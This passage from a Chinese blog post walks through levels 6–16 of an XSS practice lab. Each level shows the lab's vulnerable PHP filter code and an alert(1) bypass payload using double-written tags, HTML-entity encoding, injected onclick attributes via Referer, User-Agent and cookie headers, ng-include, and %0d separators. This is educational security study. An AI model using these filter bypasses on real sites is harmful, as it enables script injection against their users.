align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该题有多种payload，基本上只要把前几题改下大小写就可以了</p>
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;rcs&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>全转换成小写了，大小写不管用，但是可以双写绕过：<code>&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</code></p>
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>可以用HTML实体来绕过过滤: <code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+<p>HTML实体：字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读</p>
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;</span><br><span class="line">else</span><br><span class="line">&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上题的基础上再添上 <code>//http://</code>就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当一个input元素里面有两个type时，那么只有第一个 <code>type</code> 属性会被浏览器解析，而第二个 <code>type</code> 属性会被忽略</p>
+<p>payload：<code>t_sort=&quot;type=&quot;text&quot;onclick=&quot;alert(1)</code></p>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在referer里面进行修改就行：<code>&quot;type=&quot;text&quot;onclick=&quot;alert(1)</code></p>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>和上题不同的是要在User-Agent里面改</p>
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>这题在cookie里面改就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;type=&quot;text&quot;onclick=&quot;alert(1)或者&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>考到了杂项，不会</p>
+<h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ng-include</strong>指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code>属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下</p>
+<p>所以这题我们只需要包含第一题的漏洞就好了：<code>src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
+<h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot; &quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot; &quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot; &quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot; &quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>1、“0D”是把光标移到同一行的顶头——回车(CR)。</p>
+<p>2、“0A”是把光标移到下一行——换行(LF)。</p>
+<p>使用替身，就是将<code>%0a</code>或者<code>%0D</code>当成空格使用，在HTML中这样是合法的</p>
+<p>payload：<code>&lt;img%0dsrc=1%0donerror=alert(1)&gt;</code></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">薯条</div><div class="post-copyright__author_desc">言念君子，温其如玉</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/')">xss学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=xss学习&amp;url=http://example.com/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/web/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/Sherlock.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ROIS冬令营题解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/10/24/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/http%E5%8D%8F%E8%AE%AE%EF%BC%8CGET%E4%BB%A5%E5%8F%8APOST/" title="http协议，GET以及POST"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-24</div><div class="title">http协议，GET以及POST</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/Sherlock.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">信息安全</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">薯条</h1><div class="author-info__desc">言念君子，温其如玉</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/cina666" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85"><span class="toc-number">2.</span> <span class="toc-text">xss挑战之旅</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">2.1.</span> <span class="toc-text">level-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">2.2.</span> <span class="toc-text">level-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">2.3.</span> <span class="toc-text">level-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">2.4.</span> <span class="toc-text">level-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">2.5.</span> <span class="toc-text">level-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">2.6.</span> <span class="toc-text">level-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7"><span class="toc-number">2.7.</span> <span class="toc-text">level-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8"><span class="toc-number">2.8.</span> <span class="toc-text">level-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-9"><span class="toc-number">2.9.</span> <span class="toc-text">level-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">2.10.</span> <span class="toc-text">level-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-11"><span class="toc-number">2.11.</span> <span class="toc-text">level-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-12"><span class="toc-number">2.12.</span> <span class="toc-text">level-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-13"><span class="toc-number">2.13.</span> <span class="toc-text">level-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-14"><span class="toc-number">2.14.</span> <span class="toc-text">level-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-15"><span class="toc-number">2.15.</span> <span class="toc-text">level-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-16"><span class="toc-number">2.16.</span> <span class="toc-text">level-16</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/" title="xss学习">xss学习</a><time datetime="2024-02-10T08:18:03.000Z" title="Created 2024-02-10 16:18:03">2024-02-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/30/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3_max/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E9%A2%98%E8%A7%A3/" title="ROIS冬令营题解">ROIS冬令营题解</a><time datetime="2024-01-30T13:33:38.000Z" title="Created 2024-01-30 21:33:38">2024-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/24/Linux%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/" title="Linux命令笔记">Linux命令笔记</a><time datetime="2024-01-24T07:49:41.000Z" title="Created 2024-01-24 15:49:41">2024-01-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/20/JavaScript_max/JvaScript%E7%AC%94%E8%AE%B0/" title="JvaScript笔记">JvaScript笔记</a><time datetime="2024-01-20T11:29:25.000Z" title="Created 2024-01-20 19:29:25">2024-01-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/15/python_max/python%E7%AC%94%E8%AE%B0/" title="python笔记">python笔记</a><time datetime="2024-01-15T12:57:34.000Z" title="Created 2024-01-15 20:57:34">2024-01-15</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="薯条" target="_blank">薯条</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/link/"><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/essay/"><span> 闲言碎语</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>2</sup></a><a href="/tags/web-mysql/" style="font-size: 0.88rem;">web mysql<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF-web/" style="font-size: 0.88rem;">前端 web<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 0.88rem;">后端<sup>2</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To 